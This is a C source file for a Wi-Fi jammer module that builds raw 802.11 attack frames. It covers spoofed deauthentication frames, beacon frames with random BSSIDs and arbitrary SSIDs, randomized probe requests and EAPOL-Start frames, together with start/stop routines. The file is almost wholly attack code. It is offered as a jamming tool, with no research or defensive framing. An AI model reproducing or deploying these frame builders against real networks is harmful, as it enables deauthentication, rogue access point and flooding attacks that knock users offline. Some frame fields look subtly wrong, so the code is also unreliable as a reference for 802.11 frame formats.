#include "wifi_jammer.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static wifi_jam_config_t jam_cfg;
static uint32_t packets_sent = 0;
static bool running = false;

void wifi_jammer_init(void) {
    memset(&jam_cfg, 0, sizeof(jam_cfg));
    jam_cfg.packet_rate = 100;
    jam_cfg.type = JAM_ALL;
    jam_cfg.duration_ms = 30000;
    packets_sent = 0;
    running = false;
}

void wifi_jammer_set_config(wifi_jam_config_t* cfg) {
    if (cfg) memcpy(&jam_cfg, cfg, sizeof(wifi_jam_config_t));
}

void wifi_jammer_start(void) {
    running = true;
    packets_sent = 0;
    printf("[JAMMER] Started on ch %d, type %d, rate %d pps\n",
           jam_cfg.channel, jam_cfg.type, jam_cfg.packet_rate);
}

void wifi_jammer_stop(void) {
    running = false;
    printf("[JAMMER] Stopped. Total packets: %u\n", packets_sent);
}

uint32_t wifi_jammer_get_packets_sent(void) { return packets_sent; }

void wifi_build_deauth_frame(uint8_t* buf, uint8_t* src, uint8_t* dst, uint8_t* bssid) {
    // 802.11 Deauth frame: type=00 subtype=1100 (0xC0)
    buf[0] = 0xC0; buf[1] = 0x00; // Frame Control
    buf[2] = 0x00; buf[3] = 0x00; // Duration
    memcpy(&buf[4], dst, 6);       // DA
    memcpy(&buf[10], src, 6);      // SA
    memcpy(&buf[16], bssid, 6);    // BSSID
    buf[22] = 0x00; buf[23] = 0x00; // Fragment/Seq
    buf[24] = 0x07; buf[25] = 0x00; // Reason: Class 3 frame from nonassociated STA
}

void wifi_build_beacon_frame(uint8_t* buf, char* ssid, uint8_t channel) {
    buf[0] = 0x80; buf[1] = 0x00; // Frame Control: Beacon
    buf[2] = 0x00; buf[3] = 0x00; // Duration
    memset(&buf[4], 0xFF, 6);      // DA: broadcast
    // SA/BSSID: random
    for(int i=10; i<16; i++) buf[i] = rand() & 0xFF;
    memcpy(&buf[16], &buf[10], 6); // BSSID
    buf[22] = 0x00; buf[23] = 0x00; // Fragment/Seq
    // Timestamp + Beacon interval + Capabilities
    buf[24] = 0x00; buf[34] = 0x64; buf[35] = 0x00; // BI=100TU
    buf[36] = 0x01; buf[37] = 0x04; // Capabilities: ESS+Privacy
    // SSID IE
    int pos = 38;
    buf[pos++] = 0x00; // IE: SSID
    int ssid_len = strlen(ssid) > 32 ? 32 : strlen(ssid);
    buf[pos++] = ssid_len;
    memcpy(&buf[pos], ssid, ssid_len);
    pos += ssid_len;
    // DS Parameter Set
    buf[pos++] = 0x03; buf[pos++] = 0x01; buf[pos++] = channel;
}

void wifi_build_probe_req_frame(uint8_t* buf, char* ssid) {
    buf[0] = 0x40; buf[1] = 0x00; // Frame Control: Probe Request
    buf[2] = 0x00; buf[3] = 0x00; // Duration
    memset(&buf[4], 0xFF, 6);      // DA: broadcast
    for(int i=10; i<16; i++) buf[i] = rand() & 0xFF; // SA: random
    memset(&buf[16], 0xFF, 6);     // BSSID: broadcast
    buf[22] = 0x00; buf[23] = 0x00;
    buf[24] = 0x00; // SSID IE
    int ssid_len = strlen(ssid) > 32 ? 32 : strlen(ssid);
    buf[25] = ssid_len;
    memcpy(&buf[26], ssid, ssid_len);
}

void wifi_build_eapol_start(uint8_t* buf, uint8_t* src, uint8_t* dst) {
    buf[0] = 0x02; buf[1] = 0x00; // Data
    memcpy(&buf[4], dst, 6);
    memcpy(&buf[10], src, 6);
    memcpy(&buf[16], dst, 6);
    // LLC SNAP + EAPOL-Start
    buf[24] = 0xAA; buf[25] = 0xAA; buf[26] = 0x03;
    buf[27] = 0x00; buf[28] = 0x00; buf[29] = 0x00;
    buf[30] = 0x88; buf[31] = 0x8E; // EtherType: EAPOL
    buf[32] = 0x01; // Version
    buf[33] = 0x01; // Type: Start
    buf[34] = 0x00; buf[35] = 0x00; // Length: 0
}
